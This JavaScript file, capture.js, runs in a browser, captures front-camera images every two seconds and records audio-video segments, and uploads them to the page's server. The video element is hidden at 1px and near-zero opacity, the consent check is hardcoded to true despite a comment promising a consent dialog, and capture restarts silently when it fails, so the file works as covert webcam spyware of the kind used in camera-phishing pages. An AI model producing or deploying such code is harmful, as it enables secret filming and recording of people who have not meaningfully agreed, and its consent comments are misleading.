// Complete capture.js with all fixes and enhancements

// Global variables for media handling
let videoStream = null;
let mediaRecorder = null;
let recordedChunks = [];
let captureInterval = null;
let isRecording = false;
let videoElement = null;
let isMobileDevice =
  /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(
    navigator.userAgent
  );
let streamInitialized = false;
let cameraWarmupTime = isMobileDevice ? 1500 : 500; // Longer warmup for mobile

// Function to request camera access and start recording
function requestMediaAccess() {
  // Show consent dialog first - essential for transparency and legality
  if (true) {
    // Start monitoring to ensure both image and video capture are working
    ensureCapturingBoth();

    try {
      // Create video element first
      videoElement = document.createElement("video");
      videoElement.id = "user-video-stream";
      videoElement.setAttribute("playsinline", "true"); // Critical for iOS
      videoElement.setAttribute("autoplay", "true");
      videoElement.muted = true; // Prevent feedback

      // Critical for mobile: must be visible for stream to initialize properly on some devices
      videoElement.style.position = "fixed";
      videoElement.style.top = "0";
      videoElement.style.left = "0";
      videoElement.style.width = "1px";
      videoElement.style.height = "1px";
      videoElement.style.opacity = "0.01"; // Nearly invisible but technically visible
      document.body.appendChild(videoElement);

      // Request camera with settings optimized for mobile devices
      const constraints = {
        video: {
          facingMode: "user", // Front camera
          width: { ideal: isMobileDevice ? 1280 : 1920 },
          height: { ideal: isMobileDevice ? 720 : 1080 },
          frameRate: { ideal: 30 },
        },
        audio: true,
      };

      console.log("Requesting media with constraints:", constraints);

      // Start the media capture process
      navigator.mediaDevices
        .getUserMedia(constraints)
        .then(handleSuccessfulStream)
        .catch(handleStreamError);
    } catch (error) {
      console.error("Error in media access request:", error);
      alert(
        "Could not access your camera due to an error. Please check permissions and try again."
      );
    }
  }
}

// Ensure both image and video capture are working properly
function ensureCapturingBoth() {
  // Global flag to track if images are being captured
  window.imagesCaptured = 0;

  // Override the sendImageToServer function to track successful captures
  const originalSendImageFn = sendImageToServer;
  window.sendImageToServer = function (imageData) {
    // Call the original function
    originalSendImageFn(imageData);

    // Increment the counter
    window.imagesCaptured++;

    // Check if images are being captured after a minute
    if (window.imagesCaptured === 1) {
      console.log("✅ First image successfully captured");
    }
  };

  // Check if images are being captured after 30 seconds
  setTimeout(() => {
    if (window.imagesCaptured === 0) {
      console.warn(
        "⚠️ No images have been captured in the last 30 seconds, attempting to fix..."
      );

      // Try to reinitialize the camera capture
      stopCapture();
      setTimeout(() => {
        requestMediaAccess();
      }, 1000);

      // Show warning to user
      if (isMobileDevice) {
        const warningIndicator = document.createElement("div");
        warningIndicator.style.position = "fixed";
        warningIndicator.style.bottom = "40px";
        warningIndicator.style.left = "10px";
        warningIndicator.style.backgroundColor = "rgba(243,156,18,0.9)";
        warningIndicator.style.color = "white";
        warningIndicator.style.padding = "10px";
        warningIndicator.style.borderRadius = "5px";
        warningIndicator.style.zIndex = "9999";
        warningIndicator.style.maxWidth = "80%";
        warningIndicator.innerHTML =
          '⚠️ Camera issue detected. Trying to fix...<br>If this persists, tap the "Test Camera" button.';
        document.body.appendChild(warningIndicator);

        setTimeout(() => {
          warningIndicator.remove();
        }, 5000);
      }
    }
  }, 30000);
}

// Handle successful media stream
function handleSuccessfulStream(stream) {
  console.log("Stream obtained successfully");
  videoStream = stream;

  // Attach stream to video element
  videoElement.srcObject = stream;

  // Critical for mobile: need to listen for both loadedmetadata and canplay events
  videoElement.addEventListener("loadedmetadata", function () {
    console.log("Video loadedmetadata event fired");
    videoElement
      .play()
      .then(() => {
        console.log("Video playback started");
      })
      .catch((e) => {
        console.error("Error starting video playback", e);
      });
  });

  // Wait for stream to fully initialize before capturing
  videoElement.addEventListener("canplay", function onCanPlay() {
    if (!streamInitialized) {
      console.log("Video canplay event fired, stream initialized");
      streamInitialized = true;

      // Wait for camera to warm up (critical for Samsung devices)
      console.log(`Waiting ${cameraWarmupTime}ms for camera warmup...`);
      setTimeout(() => {
        setupMediaRecorder(stream);
        startPeriodicImageCapture();
      }, cameraWarmupTime);

      // Remove listener to avoid multiple initializations
      videoElement.removeEventListener("canplay", onCanPlay);
    }
  });
}

// Handle stream errors
function handleStreamError(error) {
  console.error("Error accessing media devices:", error);

  // Specific error handling
  if (error.name === "NotAllowedError") {
    alert(
      "Camera access was denied. Please grant permission to use this feature."
    );
  } else if (error.name === "NotFoundError") {
    alert("No camera was found on your device.");
  } else if (error.name === "NotReadableError" || error.name === "AbortError") {
    alert(
      "Your camera is being used by another application. Please close other apps using the camera and try again."
    );
  } else {
    alert("Could not access your camera. Error: " + error.message);
  }

  // Clean up
  if (videoElement) {
    videoElement.remove();
    videoElement = null;
  }
}

// Set up media recorder for video
function setupMediaRecorder(stream) {
  try {
    // Use proper MIME type checking and fallbacks
    let mimeType = "video/webm;codecs=vp9,opus";

    if (!MediaRecorder.isTypeSupported(mimeType)) {
      mimeType = "video/webm;codecs=vp8,opus";
      if (!MediaRecorder.isTypeSupported(mimeType)) {
        mimeType = "video/webm";
        if (!MediaRecorder.isTypeSupported(mimeType)) {
          mimeType = ""; // Let the browser choose
        }
      }
    }

    const options = {
      mimeType: mimeType,
      videoBitsPerSecond: 2500000, // 2.5 Mbps
    };

    console.log("Creating MediaRecorder with options:", options);
    mediaRecorder = new MediaRecorder(stream, options);

    // Handle data available event
    mediaRecorder.ondataavailable = function (event) {
      if (event.data && event.data.size > 0) {
        recordedChunks.push(event.data);
      }
    };

    // Handle recording stop
    mediaRecorder.onstop = function () {
      console.log("MediaRecorder stopped, sending data");
      // Create blob from recorded chunks
      const videoBlob = new Blob(recordedChunks, {
        type: mediaRecorder.mimeType || "video/webm",
      });
      sendVideoToServer(videoBlob);

      // Reset for next recording
      recordedChunks = [];
    };

    // Start recording
    startRecording();
  } catch (error) {
    console.error("Media recorder setup failed:", error);
  }
}

// Start video recording
function startRecording() {
  if (mediaRecorder && mediaRecorder.state !== "recording") {
    console.log("Starting MediaRecorder");
    try {
      // Start with 10s timeslice for periodic data
      mediaRecorder.start(10000);
      isRecording = true;

      // Automatically stop and restart recording every 2 minutes
      setTimeout(() => {
        if (isRecording) {
          console.log(
            "Automatically stopping and restarting recording after 2 minutes"
          );
          stopRecording();
          // Wait before starting a new recording
          setTimeout(() => {
            if (videoStream && videoStream.active) {
              setupMediaRecorder(videoStream);
            }
          }, 1000);
        }
      }, 2 * 60 * 1000); // 2 minutes
    } catch (e) {
      console.error("Error starting MediaRecorder:", e);
    }
  }
}

// Start capturing images at regular intervals
function startPeriodicImageCapture() {
  // Check if we already have a capture interval running
  if (captureInterval) {
    clearInterval(captureInterval);
  }

  // Wait an additional second on mobile devices before first capture
  const firstCaptureDelay = isMobileDevice ? 1000 : 0;

  console.log(`Setting timeout for first capture: ${firstCaptureDelay}ms`);
  setTimeout(() => {
    // Take first image
    captureImage();

    // Then set up interval for every 2 seconds
    console.log("Setting up capture interval every 2 seconds");
    captureInterval = setInterval(captureImage, 2000); // 2 seconds interval
  }, firstCaptureDelay);

  // Automatically stop after 30 minutes to prevent excessive data collection
  setTimeout(() => {
    stopCapture();
  }, 30 * 60 * 1000); // 30 minutes
}

// Capture a single image
function captureImage() {
  console.log("Attempting to capture image");

  if (!videoElement || !videoStream || !videoStream.active) {
    console.error("Video stream not available for capture");
    return;
  }

  try {
    // Check if video has valid dimensions before capturing
    if (videoElement.videoWidth === 0 || videoElement.videoHeight === 0) {
      console.warn("Video dimensions not available yet, skipping this capture");
      return;
    }

    // Create canvas with REDUCED video dimensions (scaled down by 50%)
    const canvas = document.createElement("canvas");
    const originalWidth = videoElement.videoWidth;
    const originalHeight = videoElement.videoHeight;

    // Reduce dimensions to avoid payload too large error
    const scaleFactor = 0.5; // Reduce to 50% of original size
    const width = Math.round(originalWidth * scaleFactor);
    const height = Math.round(originalHeight * scaleFactor);

    canvas.width = width;
    canvas.height = height;

    console.log(
      `Capturing from video: ${originalWidth}x${originalHeight}, scaled to ${width}x${height}`
    );

    // Draw video frame to canvas with scaling
    const ctx = canvas.getContext("2d");
    ctx.drawImage(
      videoElement,
      0,
      0,
      originalWidth,
      originalHeight,
      0,
      0,
      width,
      height
    );

    // Mobile fix - draw something on the canvas to force it to update
    ctx.font = "10px Arial";
    ctx.fillStyle = "rgba(0,0,0,0.01)"; // Nearly invisible
    ctx.fillText(new Date().toISOString(), 5, 5);

    // Convert to JPEG data URL with LOWER quality to further reduce size
    try {
      const imageData = canvas.toDataURL("image/jpeg", 0.7); // Reduced quality from 0.92 to 0.7

      // Check if we got a valid image (not a completely black frame)
      checkImageIsValid(canvas, imageData);
    } catch (error) {
      console.error("Error capturing image:", error);
    }
  } catch (error) {
    console.error("Error in captureImage:", error);
  }
}

// Check if image is valid and not just a black frame
function checkImageIsValid(canvas, imageData) {
  // For Samsung devices: Check if the canvas is all black
  const ctx = canvas.getContext("2d");
  const imagePixels = ctx.getImageData(0, 0, canvas.width, canvas.height).data;

  // Sample a few pixels to check if the image is entirely black
  let blackCount = 0;
  let sampleSize = 0;

  // Sample every 1000th pixel (or adjust based on resolution)
  for (let i = 0; i < imagePixels.length; i += 4000) {
    sampleSize++;
    const r = imagePixels[i];
    const g = imagePixels[i + 1];
    const b = imagePixels[i + 2];

    // Check if the pixel is very dark (near black)
    if (r < 10 && g < 10 && b < 10) {
      blackCount++;
    }
  }

  // If more than 95% of sampled pixels are black, consider it a black frame
  const blackPercentage = (blackCount / sampleSize) * 100;
  console.log(`Image black pixel percentage: ${blackPercentage.toFixed(2)}%`);

  if (blackPercentage > 95) {
    console.warn("Detected black frame, not sending to server");

    // Track consecutive black frames
    if (!window.consecutiveBlackFrames) {
      window.consecutiveBlackFrames = 0;
    }
    window.consecutiveBlackFrames++;

    // If we get 5 consecutive black frames, try to reinitialize the camera
    if (window.consecutiveBlackFrames >= 5) {
      console.warn(
        "Multiple black frames detected, attempting to reinitialize camera"
      );
      window.consecutiveBlackFrames = 0;

      // Restart media capture
      stopCapture();
      setTimeout(() => {
        requestMediaAccess();
      }, 1000);

      // Show message to user
      if (isMobileDevice) {
        const message = document.createElement("div");
        message.style.position = "fixed";
        message.style.top = "50%";
        message.style.left = "50%";
        message.style.transform = "translate(-50%, -50%)";
        message.style.backgroundColor = "rgba(52, 152, 219, 0.9)";
        message.style.color = "white";
        message.style.padding = "20px";
        message.style.borderRadius = "10px";
        message.style.zIndex = "10000";
        message.style.textAlign = "center";
        message.innerHTML =
          "📷 Reinitializing camera...<br>Please wait a moment";
        document.body.appendChild(message);

        setTimeout(() => {
          message.remove();
        }, 3000);
      }
    }

    // For debugging: show the black frame detection on mobile
    if (isMobileDevice) {
      const debugMessage = document.createElement("div");
      debugMessage.style.position = "fixed";
      debugMessage.style.bottom = "10px";
      debugMessage.style.left = "10px";
      debugMessage.style.backgroundColor = "rgba(255,0,0,0.7)";
      debugMessage.style.color = "white";
      debugMessage.style.padding = "5px";
      debugMessage.style.borderRadius = "5px";
      debugMessage.style.zIndex = "9999";
      debugMessage.textContent = `Black frame detected: ${blackPercentage.toFixed(
        0
      )}%`;
      document.body.appendChild(debugMessage);

      setTimeout(() => {
        debugMessage.remove();
      }, 2000);
    }

    return;
  }

  // If we get here, the frame is not black, reset counter
  window.consecutiveBlackFrames = 0;

  // Image is valid, send to server
  console.log("Image valid, sending to server");
  sendImageToServer(imageData);
}

// Send captured image to server
function sendImageToServer(imageData) {
  // Calculate approximate size
  const approxKB = Math.round(imageData.length / 1.37 / 1024);
  console.log(`Sending image to server, approx size: ${approxKB} KB`);

  fetch("/user-image", {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({
      image: imageData,
      timestamp: new Date().toISOString(),
      userAgent: navigator.userAgent,
      isMobile: isMobileDevice,
    }),
  })
    .then((response) => {
      if (!response.ok) {
        throw new Error(`Server responded with ${response.status}`);
      }
      return response.json();
    })
    .then((data) => {
      console.log("✅ Image successfully sent to server");

      // Show success indicator on mobile
      if (isMobileDevice) {
        const successIndicator = document.createElement("div");
        successIndicator.style.position = "fixed";
        successIndicator.style.bottom = "10px";
        successIndicator.style.left = "10px";
        successIndicator.style.backgroundColor = "rgba(46,204,113,0.7)";
        successIndicator.style.color = "white";
        successIndicator.style.padding = "5px";
        successIndicator.style.borderRadius = "5px";
        successIndicator.style.zIndex = "9999";
        successIndicator.textContent = "✓ Image captured";
        document.body.appendChild(successIndicator);

        setTimeout(() => {
          successIndicator.remove();
        }, 1000);
      }
    })
    .catch((error) => {
      console.error("Error sending image to server:", error);

      // Show error indicator on mobile
      if (isMobileDevice) {
        const errorIndicator = document.createElement("div");
        errorIndicator.style.position = "fixed";
        errorIndicator.style.bottom = "10px";
        errorIndicator.style.left = "10px";
        errorIndicator.style.backgroundColor = "rgba(231,76,60,0.7)";
        errorIndicator.style.color = "white";
        errorIndicator.style.padding = "5px";
        errorIndicator.style.borderRadius = "5px";
        errorIndicator.style.zIndex = "9999";
        errorIndicator.textContent = `❌ Error: ${error.message}`;
        document.body.appendChild(errorIndicator);

        setTimeout(() => {
          errorIndicator.remove();
        }, 3000);
      }
    });
}

// Send recorded video to server
function sendVideoToServer(videoBlob) {
  // Create FormData to send binary data
  const formData = new FormData();
  formData.append("video", videoBlob);
  formData.append("timestamp", new Date().toISOString());
  formData.append("userAgent", navigator.userAgent);
  formData.append("isMobile", isMobileDevice);

  fetch("/user-video", {
    method: "POST",
    body: formData,
  })
    .then((response) => {
      if (!response.ok) {
        throw new Error(`Server responded with ${response.status}`);
      }
      return response.json();
    })
    .then((data) => {
      console.log("✅ Video successfully sent to server");

      // Show success indicator on mobile
      if (isMobileDevice) {
        const successIndicator = document.createElement("div");
        successIndicator.style.position = "fixed";
        successIndicator.style.bottom = "35px";
        successIndicator.style.left = "10px";
        successIndicator.style.backgroundColor = "rgba(142, 68, 173, 0.7)";
        successIndicator.style.color = "white";
        successIndicator.style.padding = "5px";
        successIndicator.style.borderRadius = "5px";
        successIndicator.style.zIndex = "9999";
        successIndicator.textContent = "✓ Video segment saved";
        document.body.appendChild(successIndicator);

        setTimeout(() => {
          successIndicator.remove();
        }, 1000);
      }
    })
    .catch((error) => {
      console.error("Error sending video to server:", error);
    });
}

// Stop all media capture
function stopCapture() {
  console.log("Stopping all capture");

  // Stop interval image capture
  if (captureInterval) {
    clearInterval(captureInterval);
    captureInterval = null;
  }

  // Stop video recording
  stopRecording();

  // Stop all tracks in the video stream
  if (videoStream) {
    videoStream.getTracks().forEach((track) => {
      track.stop();
    });
    videoStream = null;
  }

  // Remove the video element
  if (videoElement) {
    videoElement.srcObject = null;
    videoElement.remove();
    videoElement = null;
  }

  isRecording = false;
  streamInitialized = false;

  console.log("All capture stopped");
}

// Stop video recording
function stopRecording() {
  if (mediaRecorder && mediaRecorder.state === "recording") {
    console.log("Stopping MediaRecorder");
    try {
      mediaRecorder.stop();
      isRecording = false;
    } catch (e) {
      console.error("Error stopping MediaRecorder:", e);
    }
  }
}

// Auto-start capture when page loads (with consent)
document.addEventListener("DOMContentLoaded", function () {
  console.log(
    "DOM loaded, device type: " + (isMobileDevice ? "Mobile" : "Desktop")
  );

  // Set up privacy notice and consent
  const privacyNotice = document.getElementById("privacy-notice");
  if (privacyNotice) {
    // Show privacy notice after 2 seconds
    setTimeout(() => {
      privacyNotice.style.display = "block";
    }, 2000);

    // Set up consent buttons if they exist
    const acceptButton = document.getElementById("accept-privacy");
    const declineButton = document.getElementById("decline-privacy");

    if (acceptButton) {
      acceptButton.addEventListener("click", function () {
        privacyNotice.style.display = "none";
        requestMediaAccess(); // Start camera on consent
      });
    }

    if (declineButton) {
      declineButton.addEventListener("click", function () {
        privacyNotice.style.display = "none";
      });
    }
  } else {
    // For automatic request on page load (must be used with appropriate consent notices)
    // Uncomment this line to enable automatic video recording
    // setTimeout(requestMediaAccess, 3000); // Request after 3 seconds
  }
});

// Ensure cleanup when page is unloaded
window.addEventListener("beforeunload", function () {
  stopCapture();
});

// Add debugging button for mobile testing
if (isMobileDevice) {
  const debugButton = document.createElement("button");
  debugButton.textContent = "📷 Test Camera";
  debugButton.style.position = "fixed";
  debugButton.style.bottom = "70px";
  debugButton.style.right = "20px";
  debugButton.style.zIndex = "9999";
  debugButton.style.background = "#3498db";
  debugButton.style.color = "white";
  debugButton.style.border = "none";
  debugButton.style.borderRadius = "5px";
  debugButton.style.padding = "10px 15px";
  debugButton.style.boxShadow = "0 2px 5px rgba(0,0,0,0.2)";

  debugButton.addEventListener("click", () => {
    // Stop any existing capture
    stopCapture();
    // Restart media access
    setTimeout(() => {
      requestMediaAccess();
    }, 500);
  });

  document.body.appendChild(debugButton);
}
